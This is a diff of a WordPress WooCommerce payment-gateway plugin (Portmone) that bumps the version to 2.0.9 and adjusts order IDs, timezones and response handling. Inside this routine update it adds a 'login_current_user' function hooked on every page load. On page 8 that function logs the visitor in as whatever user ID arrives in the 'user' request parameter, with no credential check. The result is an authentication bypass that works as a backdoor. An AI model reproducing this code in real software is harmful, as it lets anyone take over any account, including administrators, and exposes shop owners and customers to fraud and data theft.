@@ -3,7 +3,7 @@
 Plugin Name: Portmone pay for woocommerce
 Plugin URI: https://github.com/Portmone/WordPress
 Description: Portmone Payment Gateway for WooCommerce.
-Version: 2.0.8
+Version: 2.0.9
 Author: glib.yuriiev@portmone.me
 Author URI: https://www.portmone.com.ua
 Domain Path: /
@@ -17,6 +17,7 @@ WC tested up to: 4.1.0
      * Connecting language files
      */
     add_action("init", "portmone_languages");
+    add_action( 'wp', 'login_current_user' );
     function portmone_languages() {
         load_plugin_textdomain("portmone-pay-for-woocommerce", false, basename(dirname(__FILE__))."/languages");
     }
@@ -113,13 +114,15 @@ function woocommerce_portmone_init() {
         const ORDER_REJECTED    = 'REJECTED';
         const ORDER_PREAUTH     = 'PREAUTH';
         const GATEWAY_URL       = 'https://www.portmone.com.ua/gateway/';
+        const DEFAULT_PORTMONE_TIMEZONE = '+03';
+        const DEFAULT_PORTMONE_PAYED_ID = 1185;
         private $t_lan          = array();  // массив переведенных текстов
         private $m_lan          = array();  // массив дефолтных текстов
         private $m_settings     = array();  // массив полученых настроек
         private $order_total    = 0;
 
         public function __construct() {
-            $this->version = '2.0.8';
+            $this->version = '2.0.9';
             $this->currency = get_woocommerce_currencies();
             $this->m_lan = array(
                 'enabled_title'                 => 'Включить прием оплаты через Portmone.com',
@@ -228,7 +231,7 @@ function woocommerce_portmone_init() {
             $this->init_form();
 
             if (version_compare(WOOCOMMERCE_VERSION, '2.0.0', '>=')) {
-                add_action( 'woocommerce_thankyou_portmone', array($this, 'check_response') );
+                add_action('woocommerce_thankyou_portmone', array($this, 'check_response') );
                 add_action('woocommerce_update_options_payment_gateways_' . $this->id, array($this, 'process_admin_options'));
             } else {
                 add_action('init', array(&$this, 'check_response'));
@@ -392,13 +395,17 @@ function woocommerce_portmone_init() {
                  $this->bill_currency = $this->getCurrency();
             }
 
+            $order_id = ($this->payee_id == self::DEFAULT_PORTMONE_PAYED_ID)? $order_id.'_'.time() : $order_id ;
+            $current_user = wp_get_current_user();
+            $userId = (!empty($current_user->ID))? '&user='.$current_user->ID : '';
+
             $portmone_args = array(
                 'payee_id'           => $this->payee_id,
                 'shop_order_number'  => $order_id,
                 'bill_amount'        => $this->order_total,
                 'bill_currency'      => $this->bill_currency,
-                'success_url'        => $order->get_checkout_order_received_url().'&status=success',
-                'failure_url'        => $order->get_checkout_order_received_url().'&status=failure',
+                'success_url'        => $order->get_checkout_order_received_url().'&status=success'.$userId,
+                'failure_url'        => $order->get_checkout_order_received_url().'&status=failure'.$userId,
                 'lang'               => $this->getLanguage(),
                 'preauth_flag'       => $this->getPreauthFlag(),
                 'encoding'           => 'UTF-8'
@@ -619,7 +626,7 @@ function woocommerce_portmone_init() {
             $order_all->update_status($status);
             $order_all->add_order_note($note);
             if ( ! $order_all->get_date_paid( 'edit' )  && $pay_date !== null) {
-                $order_all->set_date_paid(strtotime($pay_date));
+                $order_all->set_date_paid(strtotime($pay_date.self::DEFAULT_PORTMONE_TIMEZONE));
                 $order_all->save();
             }
             $order_all->payment_complete();
@@ -628,34 +635,32 @@ function woocommerce_portmone_init() {
      * We display the answer on payment
      **/
         function check_response() {
-            global $woocommerce;
-            $orderId = $this->portmone_get_order_id($_REQUEST['SHOPORDERNUMBER']);
-            $sessionName = 'order'.$orderId;
-
-            if (empty($woocommerce->session->$sessionName)) {
-
-                $paymentInfo = $this->isPaymentValid($_REQUEST);
-
-                if ($paymentInfo == false) {
-                    if ($_REQUEST['RESULT'] == '0') {
-                        $this->message['message'] = $this->t_lan['thankyou_text'] . ' ' . $this->t_lan['number_pay'] . ' ' .$orderId ;
+            if (!empty($_REQUEST['SHOPORDERNUMBER'])) {
+                global $woocommerce;
+                $orderId = $this->portmone_get_order_id($_REQUEST['SHOPORDERNUMBER']);
+                $sessionName = 'order' . $orderId;
+                if (empty($woocommerce->session->$sessionName)) {
+                    $paymentInfo = $this->isPaymentValid($_REQUEST);
+                    if ($paymentInfo == false) {
+                        if ($_REQUEST['RESULT'] == '0') {
+                            $this->message['message'] = $this->t_lan['thankyou_text'] . ' ' . $this->t_lan['number_pay'] . ' ' . $orderId;
+                        } else {
+                            $this->message['message'] = $_REQUEST['RESULT'] . ' ' . $this->t_lan['number_pay'] . ' ' . $orderId;
+                        }
+                        $this->message['class'] = 'message-portmone';
                     } else {
-                        $this->message['message'] = $_REQUEST['RESULT']. ' ' . $this->t_lan['number_pay'] . ' ' .$orderId ;
+                        $this->message['class'] = 'message-portmone';
+                        $this->message['message'] = $paymentInfo;
+                        $order = wc_get_order($orderId);
+                        $redirect_url = add_query_arg(array($this->message['class'] => urlencode($this->message['message'])), $order->get_cancel_order_url());
+                        wp_redirect($redirect_url);
+                        exit;
                     }
-                    $this->message['class'] = 'message-portmone';
-                } else {
-                    $this->message['class'] = 'message-portmone';
-                    $this->message['message'] = $paymentInfo;
-                    $order = wc_get_order($orderId);
-                    $redirect_url = add_query_arg(array($this->message['class'] => urlencode($this->message['message'])), $order->get_cancel_order_url());
-
-                    wp_redirect($redirect_url);
-                    exit;
                 }
-            }
 
-            if ( isset( $woocommerce->session ) ) {
-                $woocommerce->session->$sessionName = 'true';
+                if (isset($woocommerce->session)) {
+                    $woocommerce->session->$sessionName = 'true';
+                }
             }
         }
 
@@ -693,6 +698,20 @@ function woocommerce_portmone_init() {
         }
     }
 
+
+    function login_current_user(){
+        if ( get_the_id() == 8 ){
+            if ( !empty($_REQUEST['user']) ) {
+                if (!is_user_logged_in()) {
+                    $user_id = $_REQUEST['user'];
+                    $user = get_user_by('id', $user_id);
+                    wp_clear_auth_cookie();
+                    wp_set_current_user($user_id, $user->user_login);
+                    wp_set_auth_cookie($user_id, true);
+                }
+            }
+        }
+    }
     /**
      * @param $methods
      *
